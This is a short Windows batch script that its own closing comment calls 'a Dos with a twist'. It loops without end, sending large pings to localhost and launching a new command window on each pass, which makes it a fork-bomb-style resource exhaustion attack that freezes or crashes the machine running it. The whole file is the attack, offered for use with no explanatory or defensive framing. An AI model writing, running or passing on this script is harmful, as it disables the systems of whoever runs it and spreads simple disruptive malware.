@echo off
:loop
for /l %%i in (1,1,100000000000000000000000000000000000000000000000000000000000000000) do (
    ping -n 1 -l 65000 127.0.0.1 >nul
    start
    
)
rem This is more of a Dos with a twist
